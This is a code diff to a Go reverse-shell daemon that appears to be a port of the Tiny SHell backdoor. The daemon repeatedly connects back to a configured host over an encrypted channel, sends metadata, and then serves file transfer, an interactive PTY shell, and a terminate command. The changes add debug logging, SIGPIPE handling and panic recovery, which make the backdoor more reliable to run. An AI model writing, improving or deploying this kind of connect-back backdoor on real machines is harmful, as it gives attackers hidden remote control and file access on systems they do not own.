@@ -77,6 +77,7 @@ func Run() {
 		syscall.SIGKILL,
 		syscall.SIGTERM,
 		syscall.SIGQUIT)
+	signal.Ignore(syscall.SIGPIPE)
 
 	StartDaemon(host, port, secret, delay)
 }
@@ -104,11 +105,18 @@ func StartDaemon(host string, port int, secret string, delay int) {
 		// connect back mode
 		addr := fmt.Sprintf("%s:%d", host, port)
 		for {
+			LogDebug("Attempting to connect to %s...", addr)
 			layer, err := pel.Dial(addr, secret, true)
 			if err == nil {
+				LogDebug("Connected successfully to %s", addr)
 				sendMetadata(layer)
+				LogDebug("Metadata sent, starting handleGeneric")
 				handleGeneric(layer)
+				LogDebug("handleGeneric returned, connection closed")
+			} else {
+				LogDebug("Connection failed: %v", err)
 			}
+			LogDebug("Sleeping for %d seconds before reconnect...", delay)
 			time.Sleep(time.Duration(delay) * time.Second)
 		}
 	}
@@ -134,15 +142,20 @@ func sendMetadata(layer *pel.PktEncLayer) {
 // automatically close connection after handling
 // it's safe to run with goroutine
 func handleGeneric(layer *pel.PktEncLayer) {
-	defer layer.Close()
+	defer func() { LogDebug("handleGeneric: Closing layer..."); layer.Close(); LogDebug("handleGeneric: Layer closed") }()
 	defer func() {
-		recover()
+		if r := recover(); r != nil {
+			LogDebug("handleGeneric: Recovered from panic: %v", r)
+		}
 	}()
+	LogDebug("handleGeneric: Waiting for command byte...")
 	buffer := make([]byte, 1)
 	n, err := layer.Read(buffer)
 	if err != nil || n != 1 {
+		LogDebug("handleGeneric: Read error or incomplete: err=%v, n=%d", err, n)
 		return
 	}
+	LogDebug("handleGeneric: Received command: 0x%02X", buffer[0])
 	switch buffer[0] {
 	case constants.GetFile:
 		handleGetFile(layer, nil, "")
@@ -151,8 +164,11 @@ func handleGeneric(layer *pel.PktEncLayer) {
 	case constants.RunShell:
 		handleRunShell(layer)
 	case constants.Terminate:
+		LogDebug("handleGeneric: Received Terminate command, exiting daemon")
 		os.Exit(0)
 	}
+		LogDebug("handleGeneric: Command handler completed")
+
 }
 
 func handleGetFile(layer *pel.PktEncLayer, initialData []byte, cwd string) {
@@ -297,15 +313,22 @@ func handleRunShell(layer *pel.PktEncLayer) {
 		LogDebug("handleRunShell: PTY Error: %v", err)
 		return
 	}
-	defer tp.Close()
+	defer func() { LogDebug("handleRunShell: Closing PTY..."); tp.Close(); LogDebug("handleRunShell: PTY closed") }()
 	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				LogDebug("handleRunShell goroutine panic: %v", r)
+			}
+		}()
 		// Modified CopyBuffer to detect tshdexit
 		buf := make([]byte, constants.Bufsize)
 		var lastBytes []byte
 		for {
 			n, err := layer.Read(buf)
 			if err != nil {
+				LogDebug("handleRunShell: Network read error: %v, closing PTY", err)
 				tp.Close()
+				layer.Close()
 				return
 			}
 			if n > 0 {
@@ -373,6 +396,7 @@ func handleRunShell(layer *pel.PktEncLayer) {
 		}
 	}()
 	utils.CopyBuffer(layer, tp.StdOut(), buffer2)
+	LogDebug("handleRunShell: CopyBuffer returned")
 }
 
 func getCwd(pid int) string {
